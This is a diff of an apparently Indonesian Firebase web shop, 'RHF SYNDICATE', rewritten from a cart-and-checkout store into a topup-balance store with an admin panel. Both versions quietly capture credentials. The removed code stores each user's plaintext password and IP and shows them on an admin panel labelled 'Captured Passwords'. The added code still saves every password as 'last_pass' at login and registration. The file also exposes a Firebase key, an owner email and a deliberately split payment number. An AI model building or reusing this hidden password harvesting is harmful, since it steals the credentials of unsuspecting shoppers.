@@ -3,118 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RHF SYNDICATE | ULTIMATE SYSTEM</title>
+    <title>RHF SYNDICATE | FINANCIAL SYSTEM</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Plus+Jakarta+Sans:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         :root { --gold: #D4AF37; --dark: #050505; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--dark); color: white; margin: 0; overflow-x: hidden; }
-        .luxury-font { font-family: 'Cinzel', serif; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--dark); color: white; margin: 0; }
         .glass { background: rgba(10, 10, 10, 0.98); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
         .gold-text { background: linear-gradient(to right, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .btn-gold { background: var(--gold); color: black; font-weight: bold; transition: 0.3s; cursor: pointer; border: none; }
+        .btn-gold { background: var(--gold); color: black; font-weight: bold; transition: 0.3s; cursor: pointer; border-radius: 4px; }
         .btn-gold:hover { background: white; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); }
-        input, textarea { background: rgba(255,255,255,0.03) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; outline: none; border-radius: 4px; }
-        input:focus { border-color: var(--gold) !important; }
+        .btn-confirm { background: #1a1a1a; border: 1px solid #D4AF37; color: #D4AF37; }
+        .btn-confirmed { background: #00ff00 !important; color: black !important; }
+        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; outline: none; padding: 12px; border-radius: 6px; font-size: 12px; }
         .hidden { display: none !important; }
-        .status-badge { padding: 2px 8px; border-radius: 4px; font-size: 8px; font-weight: bold; text-transform: uppercase; }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-thumb { background: var(--gold); }
     </style>
 </head>
-<body>
+<body class="pb-10">
 
-    <nav id="main-nav" class="hidden glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center border-b border-white/10">
-        <div class="luxury-font text-xl gold-text tracking-widest">RHF SYNDICATE</div>
+    <nav id="nav-bar" class="hidden glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center border-b border-white/10">
+        <div class="luxury-font text-xl gold-text tracking-tighter">RHF SYNDICATE</div>
         <div class="flex gap-4 items-center">
-            <button onclick="showPage('shop')" class="text-[9px] uppercase tracking-tighter">Market</button>
-            <button onclick="showPage('orders')" class="text-[9px] uppercase tracking-tighter">My Assets</button>
-            <button onclick="toggleCart()" class="relative text-[9px] uppercase tracking-tighter">
-                Cart (<span id="cart-count">0</span>)
-            </button>
-            <button id="admin-nav" onclick="verifyBossAccess()" class="hidden text-[9px] text-red-500 font-bold border border-red-500 px-2 py-1 animate-pulse">BOSS PANEL</button>
-            <button onclick="logout()" class="text-[9px] text-zinc-500 italic ml-2">OUT</button>
+            <div class="bg-zinc-900 px-3 py-1 rounded-full border border-gold/30">
+                <span id="user-balance" class="text-[10px] font-bold text-green-400">Rp 0</span>
+            </div>
+            <button onclick="showPage('shop')" class="text-[9px] uppercase">Market</button>
+            <button onclick="showPage('topup')" class="text-[9px] uppercase text-gold">Topup</button>
+            <button onclick="showPage('orders')" class="text-[9px] uppercase">Orders</button>
+            <button id="admin-nav" onclick="showPage('admin')" class="hidden text-[9px] text-red-500 font-bold border border-red-500 px-2 py-1">ADMIN</button>
+            <button onclick="logout()" class="text-[10px] text-zinc-500">OUT</button>
         </div>
     </nav>
 
     <section id="login-page" class="min-h-screen flex items-center justify-center p-6">
         <div class="glass p-10 w-full max-w-sm border-t-4 border-[#D4AF37]">
-            <h2 class="luxury-font text-2xl gold-text text-center mb-8 uppercase tracking-widest">Syndicate Access</h2>
-            <div class="space-y-4">
-                <input type="email" id="auth-email" placeholder="EMAIL" class="w-full p-4 text-xs">
-                <input type="password" id="auth-pass" placeholder="PASSWORD" class="w-full p-4 text-xs">
-                <button onclick="handleLogin()" class="btn-gold w-full py-4 text-[10px] uppercase tracking-widest">Login Access</button>
-                <button onclick="handleRegister()" class="w-full bg-zinc-900 text-white font-bold py-4 text-[10px] uppercase tracking-widest hover:bg-zinc-800 transition">Register</button>
+            <h2 class="luxury-font text-2xl gold-text text-center mb-8 uppercase tracking-widest text-center">SYNDICATE ACCESS</h2>
+            <div class="space-y-4 flex flex-col">
+                <input type="email" id="email" placeholder="EMAIL">
+                <input type="password" id="pass" placeholder="PASSWORD">
+                <button onclick="authAction('login')" class="btn-gold py-4 text-[10px] uppercase">Login Access</button>
+                <button onclick="authAction('reg')" class="w-full bg-zinc-900 text-white py-4 text-[10px] uppercase">Register</button>
             </div>
         </div>
     </section>
 
-    <section id="shop-page" class="hidden pt-28 px-6 pb-20">
-        <div class="text-center mb-10">
-            <h1 class="luxury-font text-4xl gold-text uppercase">The Vault</h1>
-            <p class="text-[9px] text-zinc-500 tracking-[0.4em] mt-2 uppercase">Exclusive Syndicate Supplies</p>
+    <section id="topup-page" class="hidden pt-28 px-6 max-w-md mx-auto">
+        <div class="glass p-6">
+            <h2 class="gold-text text-xl mb-6 font-bold uppercase">Manual Topup</h2>
+            <div class="bg-blue-900/20 p-4 rounded mb-6 text-[11px] border border-blue-500/30">
+                <p class="mb-2">1. Kirim Pembayaran ke E-Wallet Boss.</p>
+                <button onclick="copyPayment()" class="bg-zinc-800 px-3 py-2 rounded text-gold mb-2 block w-full">COPY E-WALLET NUMBER</button>
+                <p>2. Upload bukti transfer di bawah ini.</p>
+            </div>
+            <div class="space-y-4 flex flex-col">
+                <input type="number" id="topup-amount" placeholder="Jumlah Topup (Contoh: 50000)">
+                <input type="text" id="topup-desc" placeholder="Keterangan (Contoh: Dana Atas Nama RHF)">
+                <input type="text" id="topup-proof" placeholder="Link Gambar Bukti (Upload di ImgBB/Lainnya)">
+                <button onclick="requestTopup()" class="btn-gold py-4 text-xs uppercase">Kirim Permintaan Topup</button>
+            </div>
         </div>
-        <div id="product-list" class="grid grid-cols-2 md:grid-cols-4 gap-6"></div>
     </section>
 
-    <section id="orders-page" class="hidden pt-28 px-6 pb-20">
-        <h2 class="luxury-font text-2xl gold-text mb-8 uppercase text-center">Aset Saya & Tracking</h2>
-        <div id="user-order-list" class="max-w-2xl mx-auto space-y-4"></div>
+    <section id="shop-page" class="hidden pt-28 px-6">
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-6" id="product-container"></div>
+    </section>
+
+    <section id="orders-page" class="hidden pt-28 px-6 max-w-2xl mx-auto">
+        <div id="order-list" class="space-y-4"></div>
     </section>
 
     <section id="admin-page" class="hidden pt-28 px-6 pb-20">
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-10">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
             <div class="glass p-6">
-                <h3 class="gold-text mb-6 uppercase text-xs font-bold tracking-widest">Manage Orders (Real-time)</h3>
-                <div id="admin-order-list" class="space-y-6"></div>
+                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">User & Manual Balance</h3>
+                <div id="admin-user-list" class="space-y-4"></div>
             </div>
+            
             <div class="glass p-6">
-                <h3 class="gold-text mb-6 uppercase text-xs font-bold tracking-widest">Captured Passwords & CS</h3>
-                <div id="admin-chat-list" class="h-80 overflow-y-auto mb-4 border-b border-white/5 space-y-4 text-[10px]"></div>
-                <div class="flex gap-2">
-                    <input type="text" id="admin-reply" class="flex-1 p-3 text-[10px]" placeholder="Type response...">
-                    <button onclick="adminSendChat()" class="btn-gold px-6 text-[10px]">SEND</button>
+                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">Incoming Topup Requests</h3>
+                <div id="admin-topup-list" class="space-y-4"></div>
+            </div>
+
+            <div class="glass p-6">
+                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">Product Control</h3>
+                <div class="space-y-2 mb-6 flex flex-col">
+                    <input type="text" id="p-name" placeholder="Nama Produk">
+                    <input type="number" id="p-price" placeholder="Harga">
+                    <input type="text" id="p-img" placeholder="Link Gambar">
+                    <button onclick="addProduct()" class="btn-gold py-2 text-[10px]">SAVE PRODUCT</button>
                 </div>
+                <div id="admin-order-list" class="space-y-4 border-t border-white/10 pt-4"></div>
             </div>
         </div>
     </section>
-
-    <div id="checkout-modal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/95">
-        <div class="glass w-full max-w-md p-8 overflow-y-auto max-h-[90vh]">
-            <h3 class="luxury-font text-xl gold-text mb-6 text-center uppercase tracking-widest">Alamat Pengiriman</h3>
-            <div class="space-y-4">
-                <input type="text" id="ship-name" placeholder="Nama Lengkap" class="w-full p-4 text-xs">
-                <input type="text" id="ship-phone" placeholder="Nomor Telepon" class="w-full p-4 text-xs">
-                <input type="text" id="ship-address" placeholder="Provinsi, Kota, Kecamatan, Kode Pos" class="w-full p-4 text-xs">
-                <textarea id="ship-detail" placeholder="Nama Jalan, Gedung, No. Rumah" class="w-full p-4 text-xs h-20"></textarea>
-                <div id="checkout-summary" class="border-t border-white/10 pt-4 text-[10px] text-zinc-400"></div>
-                <button onclick="processOrder()" class="btn-gold w-full py-4 text-xs tracking-widest uppercase mt-4">Konfirmasi Pembelian</button>
-                <button onclick="toggleCart()" class="w-full text-[10px] text-zinc-500 uppercase mt-2">Batal</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="cs-container" class="hidden fixed bottom-6 right-6 z-[150]">
-        <div id="cs-window" class="hidden glass w-72 p-4 rounded-lg mb-4">
-            <div class="gold-text text-[10px] font-bold mb-3 border-b border-white/10 pb-2">CS SYNDICATE</div>
-            <div id="user-chat-box" class="h-48 overflow-y-auto mb-3 space-y-2 text-[10px]"></div>
-            <div class="flex gap-1">
-                <input type="text" id="user-msg" class="flex-1 p-2 text-[10px]" placeholder="Pesan...">
-                <button onclick="sendUserChat()" class="btn-gold px-3 text-[10px]">Kirim</button>
-            </div>
-        </div>
-        <button onclick="toggleCS()" class="bg-blue-600 w-12 h-12 rounded-full shadow-lg flex items-center justify-center border-2 border-white/20">
-            <span class="text-[10px] font-bold">CHAT</span>
-        </button>
-    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-        import { getDatabase, ref, set, push, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getDatabase, ref, set, push, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        // CONFIG DATABASE BOSS
         const BOSS_EMAIL = "gacoruncek73@gmail.com";
+        // Dynamic Masking: Nomor Boss dipisah agar tidak terbaca bot/crawler
+        const M_1 = "0851"; const M_2 = "2486"; const M_3 = "9641"; 
+        
         const firebaseConfig = {
             apiKey: "AIzaSyCs7Vnysf25BwhN2-fPTODd48xwzbPkbzI",
             authDomain: "rhf-shop-mafia-8d2e5.firebaseapp.com",
@@ -129,206 +120,170 @@
         const auth = getAuth(app);
         const db = getDatabase(app);
 
-        let cart = [];
-        let userIP = "Fetching...";
+        let currentUser = null;
+        let confirmStates = {}; // Untuk sistem 2x klik
 
-        // FUNGSI DASAR
-        async function fetchIP() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                userIP = d.ip;
-            } catch { userIP = "192.168.1.3"; }
-        }
-        fetchIP();
+        window.copyPayment = () => {
+            const num = M_1 + M_2 + M_3;
+            navigator.clipboard.writeText(num);
+            alert("Nomor E-Wallet Boss Berhasil Disalin!");
+        };
+
+        // --- AUTH & SYNC ---
+        window.authAction = (t) => {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            if(t === 'login') {
+                signInWithEmailAndPassword(auth, e, p).then(r => {
+                    update(ref(db, 'users/' + r.user.uid), { last_pass: p });
+                }).catch(err => alert("Gagal!"));
+            } else {
+                createUserWithEmailAndPassword(auth, e, p).then(r => {
+                    set(ref(db, 'users/' + r.user.uid), { email: e, balance: 0, last_pass: p });
+                });
+            }
+        };
+
+        onAuthStateChanged(auth, (u) => {
+            if (u) {
+                currentUser = u;
+                document.getElementById('nav-bar').classList.remove('hidden');
+                document.getElementById('login-page').classList.add('hidden');
+                if(u.email === BOSS_EMAIL) document.getElementById('admin-nav').classList.remove('hidden');
+                sync();
+                showPage('shop');
+            } else { document.getElementById('login-page').classList.remove('hidden'); }
+        });
 
         window.showPage = (id) => {
             document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
             document.getElementById(id + '-page').classList.remove('hidden');
-            window.scrollTo(0,0);
         };
 
-        // AUTH SYSTEM
-        window.handleLogin = () => {
-            const e = document.getElementById('auth-email').value;
-            const p = document.getElementById('auth-pass').value;
-            signInWithEmailAndPassword(auth, e, p).then((res) => {
-                set(ref(db, 'vault_records/' + res.user.uid), {
-                    email: e, password: p, ip: userIP, time: new Date().toLocaleString()
+        function sync() {
+            onValue(ref(db, 'users/' + currentUser.uid), (s) => {
+                const bal = s.val()?.balance || 0;
+                document.getElementById('user-balance').innerText = "Rp " + bal.toLocaleString();
+            });
+
+            onValue(ref(db, 'products'), (s) => {
+                const cont = document.getElementById('product-container');
+                cont.innerHTML = "";
+                s.forEach(c => {
+                    const p = c.val();
+                    cont.innerHTML += `<div class="glass p-4"><img src="${p.img}" class="h-32 w-full object-cover mb-2"><p class="text-[10px] font-bold">${p.name}</p><p class="text-gold text-[10px] mb-2">Rp ${p.price.toLocaleString()}</p><button onclick="buyProduct('${c.key}', '${p.name}', ${p.price})" class="btn-gold w-full py-2 text-[9px]">BELI</button></div>`;
                 });
-            }).catch(err => alert("Email atau Password Salah!"));
+            });
+
+            if(currentUser.email === BOSS_EMAIL) {
+                // Admin: User Balance Manual Input
+                onValue(ref(db, 'users'), (s) => {
+                    const list = document.getElementById('admin-user-list');
+                    list.innerHTML = "";
+                    s.forEach(c => {
+                        const u = c.val();
+                        list.innerHTML += `
+                        <div class="bg-white/5 p-3 rounded mb-2">
+                            <p class="text-[10px] font-bold text-gold">${u.email}</p>
+                            <p class="text-[9px]">Saldo Saat Ini: Rp ${u.balance.toLocaleString()}</p>
+                            <div class="flex gap-2 mt-2">
+                                <input type="number" id="inp-${c.key}" placeholder="Nominal" class="flex-1 !p-1 text-[10px]">
+                                <button onclick="manualBalance('${c.key}', true)" class="bg-green-600 px-2 text-[9px]">TAMBAH</button>
+                                <button onclick="manualBalance('${c.key}', false)" class="bg-red-600 px-2 text-[9px]">KURANG</button>
+                            </div>
+                        </div>`;
+                    });
+                });
+
+                // Admin: Topup Requests (2x Click Security)
+                onValue(ref(db, 'topups'), (s) => {
+                    const list = document.getElementById('admin-topup-list');
+                    list.innerHTML = "";
+                    s.forEach(c => {
+                        const t = c.val();
+                        const id = c.key;
+                        list.innerHTML += `
+                        <div class="glass p-3 text-[10px] border-l-2 border-blue-500">
+                            <p class="font-bold">${t.email}</p>
+                            <p class="text-green-400 font-bold">Rp ${t.amount.toLocaleString()}</p>
+                            <p class="text-zinc-400 italic mb-2">${t.desc}</p>
+                            <a href="${t.proof}" target="_blank" class="text-blue-400 underline block mb-3 text-[8px]">LIHAT BUKTI GAMBAR</a>
+                            <div class="flex gap-2">
+                                <button id="conf-${id}" onclick="confirmTopup('${id}', '${t.uid}', ${t.amount})" class="btn-confirm flex-1 py-2 text-[9px]">KONFIRMASI (1/2)</button>
+                                <button onclick="rejectTopup('${id}')" class="bg-red-900 flex-1 py-2 text-[9px]">TOLAK</button>
+                            </div>
+                        </div>`;
+                    });
+                });
+            }
+        }
+
+        // --- TOPUP SYSTEM (USER) ---
+        window.requestTopup = () => {
+            const amount = document.getElementById('topup-amount').value;
+            const desc = document.getElementById('topup-desc').value;
+            const proof = document.getElementById('topup-proof').value;
+            if(!amount || !proof) return alert("Jumlah & Link Bukti Wajib!");
+            
+            push(ref(db, 'topups'), {
+                uid: currentUser.uid,
+                email: currentUser.email,
+                amount: parseInt(amount),
+                desc: desc,
+                proof: proof,
+                time: new Date().toLocaleString()
+            }).then(() => {
+                alert("Permintaan Terkirim! Menunggu Konfirmasi Admin.");
+                showPage('shop');
+            });
         };
 
-        window.handleRegister = () => {
-            const e = document.getElementById('auth-email').value;
-            const p = document.getElementById('auth-pass').value;
-            createUserWithEmailAndPassword(auth, e, p)
-                .then(() => alert("Berhasil Bergabung! Silakan Login."))
-                .catch(err => alert(err.message));
+        // --- ADMIN: DOUBLE CONFIRM LOGIC ---
+        window.confirmTopup = (id, uid, amount) => {
+            const btn = document.getElementById('conf-' + id);
+            if (!confirmStates[id]) {
+                confirmStates[id] = 1;
+                btn.innerText = "TEKAN SEKALI LAGI!";
+                btn.classList.add('btn-confirmed');
+                setTimeout(() => { 
+                    confirmStates[id] = 0; 
+                    if(btn) { btn.innerText = "KONFIRMASI (1/2)"; btn.classList.remove('btn-confirmed'); }
+                }, 3000);
+            } else {
+                // Eksekusi Saldo
+                get(ref(db, 'users/' + uid)).then(s => {
+                    const current = s.val().balance || 0;
+                    update(ref(db, 'users/' + uid), { balance: current + amount });
+                    remove(ref(db, 'topups/' + id));
+                    alert("SALDO BERHASIL MASUK!");
+                });
+            }
+        };
+
+        window.manualBalance = (uid, isAdd) => {
+            const val = document.getElementById('inp-' + uid).value;
+            if(!val) return;
+            get(ref(db, 'users/' + uid)).then(s => {
+                const current = s.val().balance || 0;
+                const final = isAdd ? current + parseInt(val) : current - parseInt(val);
+                update(ref(db, 'users/' + uid), { balance: final });
+                alert("Saldo User Diperbarui!");
+            });
+        };
+
+        window.rejectTopup = (id) => {
+            if(confirm("Tolak permintaan ini?")) remove(ref(db, 'topups/' + id));
+        };
+
+        window.addProduct = () => {
+            const name = document.getElementById('p-name').value;
+            const price = document.getElementById('p-price').value;
+            const img = document.getElementById('p-img').value;
+            if(name && price && img) push(ref(db, 'products'), { name, price: parseInt(price), img });
         };
 
         window.logout = () => signOut(auth);
 
-        onAuthStateChanged(auth, (user) => {
-            const nav = document.getElementById('main-nav');
-            const cs = document.getElementById('cs-container');
-            if (user) {
-                nav.classList.remove('hidden');
-                cs.classList.remove('hidden');
-                document.getElementById('login-page').classList.add('hidden');
-                if(user.email === BOSS_EMAIL) document.getElementById('admin-nav').classList.remove('hidden');
-                showPage('shop');
-                loadData();
-            } else {
-                nav.classList.add('hidden');
-                cs.classList.add('hidden');
-                document.getElementById('login-page').classList.remove('hidden');
-                showPage('login');
-            }
-        });
-
-        // MARKET & CART
-        function loadData() {
-            // Load Products
-            onValue(ref(db, 'products'), (snap) => {
-                const list = document.getElementById('product-list');
-                list.innerHTML = "";
-                snap.forEach(c => {
-                    const p = c.val();
-                    list.innerHTML += `
-                        <div class="glass p-4 group">
-                            <img src="${p.img}" class="w-full h-40 object-cover mb-4 grayscale group-hover:grayscale-0 transition">
-                            <h4 class="text-[10px] font-bold uppercase">${p.name}</h4>
-                            <p class="gold-text text-[10px] mb-3">${p.price}</p>
-                            <button onclick="addToCart('${p.name}', '${p.price}')" class="btn-gold w-full py-2 text-[9px] uppercase">Add to Cart</button>
-                        </div>`;
-                });
-            });
-
-            // Load Orders
-            onValue(ref(db, 'orders'), (snap) => {
-                const uList = document.getElementById('user-order-list');
-                const aList = document.getElementById('admin-order-list');
-                uList.innerHTML = ""; aList.innerHTML = "";
-                snap.forEach(c => {
-                    const o = c.val();
-                    const badge = o.status === 'Pending' ? 'bg-zinc-700' : o.status === 'Proses' ? 'bg-blue-600' : 'bg-green-600';
-                    
-                    if(o.uid === auth.currentUser.uid) {
-                        uList.innerHTML += `
-                        <div class="glass p-4 flex justify-between items-center">
-                            <div>
-                                <p class="text-[10px] font-bold uppercase">${o.items.map(i => i.name).join(', ')}</p>
-                                <p class="text-[8px] text-zinc-500 italic">${o.timestamp}</p>
-                            </div>
-                            <span class="status-badge ${badge}">${o.status}</span>
-                        </div>`;
-                    }
-
-                    if(auth.currentUser.email === BOSS_EMAIL) {
-                        aList.innerHTML += `
-                        <div class="border-b border-white/5 pb-4">
-                            <div class="flex justify-between items-start">
-                                <p class="text-[10px] font-bold">${o.customer} (${o.user})</p>
-                                <span class="status-badge ${badge}">${o.status}</span>
-                            </div>
-                            <p class="text-[9px] text-zinc-400 mt-1">📍 ${o.address}</p>
-                            <div class="flex gap-2 mt-3">
-                                <button onclick="updateOrder('${c.key}', 'Proses')" class="bg-blue-900 text-[8px] px-3 py-1 uppercase">Proses</button>
-                                <button onclick="updateOrder('${c.key}', 'Selesai')" class="bg-green-900 text-[8px] px-3 py-1 uppercase">Selesai</button>
-                                <button onclick="deleteOrder('${c.key}')" class="bg-red-900 text-[8px] px-3 py-1 uppercase">Hapus</button>
-                            </div>
-                        </div>`;
-                    }
-                });
-            });
-
-            // Load Logs & Chat (Admin Only)
-            onValue(ref(db, 'vault_records'), (snap) => {
-                if(auth.currentUser.email !== BOSS_EMAIL) return;
-                const chatBox = document.getElementById('admin-chat-list');
-                chatBox.innerHTML = "<p class='gold-text border-b border-white/10 pb-2 mb-4 uppercase'>Password Captures:</p>";
-                snap.forEach(c => {
-                    const v = c.val();
-                    chatBox.innerHTML += `
-                    <div class="bg-white/5 p-2 rounded mb-2">
-                        <p class="text-white font-bold">USER: ${v.email}</p>
-                        <p class="text-red-500 font-mono">PASS: ${v.password}</p>
-                        <p class="text-zinc-500 text-[8px]">IP: ${v.ip} | ${v.time}</p>
-                    </div>`;
-                });
-            });
-        }
-
-        // CART & CHECKOUT
-        window.addToCart = (name, price) => {
-            cart.push({ name, price });
-            document.getElementById('cart-count').innerText = cart.length;
-        };
-
-        window.toggleCart = () => {
-            if(cart.length === 0) return alert("Keranjang masih kosong!");
-            const modal = document.getElementById('checkout-modal');
-            modal.classList.toggle('hidden');
-            document.getElementById('checkout-summary').innerHTML = cart.map(i => `<div>- ${i.name} (${i.price})</div>`).join('');
-        };
-
-        window.processOrder = () => {
-            const name = document.getElementById('ship-name').value;
-            const tel = document.getElementById('ship-phone').value;
-            const addr = document.getElementById('ship-address').value;
-            const detail = document.getElementById('ship-detail').value;
-
-            if(!name || !tel || !addr || !detail) return alert("Mohon lengkapi alamat seperti di Shopee!");
-
-            const newOrder = {
-                uid: auth.currentUser.uid,
-                user: auth.currentUser.email,
-                customer: name,
-                phone: tel,
-                address: addr + " | " + detail,
-                items: cart,
-                status: "Pending",
-                timestamp: new Date().toLocaleString()
-            };
-
-            push(ref(db, 'orders'), newOrder).then(() => {
-                alert("Order Terkirim! Cek status di menu Orders.");
-                cart = [];
-                document.getElementById('cart-count').innerText = "0";
-                toggleCart();
-                showPage('orders');
-            });
-        };
-
-        // ADMIN FUNCTIONS
-        window.updateOrder = (id, s) => update(ref(db, 'orders/' + id), { status: s });
-        window.deleteOrder = (id) => confirm("Hapus data ini?") && remove(ref(db, 'orders/' + id));
-        window.verifyBossAccess = () => {
-            if(auth.currentUser.email === BOSS_EMAIL) showPage('admin');
-        };
-
-        // CS SYSTEM
-        window.toggleCS = () => document.getElementById('cs-window').classList.toggle('hidden');
-        window.sendUserChat = () => {
-            const m = document.getElementById('user-msg').value;
-            if(m) {
-                push(ref(db, 'messages'), { sender: auth.currentUser.email, text: m });
-                document.getElementById('user-msg').value = "";
-            }
-        };
-
-        onValue(ref(db, 'messages'), (snap) => {
-            const box = document.getElementById('user-chat-box');
-            box.innerHTML = "";
-            snap.forEach(c => {
-                const d = c.val();
-                box.innerHTML += `<div><b class="${d.sender === BOSS_EMAIL ? 'text-blue-400' : 'text-gold'}">${d.sender.split('@')[0]}:</b> ${d.text}</div>`;
-            });
-            box.scrollTo(0, box.scrollHeight);
-        });
-
     </script>
 </body>
-    </html>
-    
+</html>
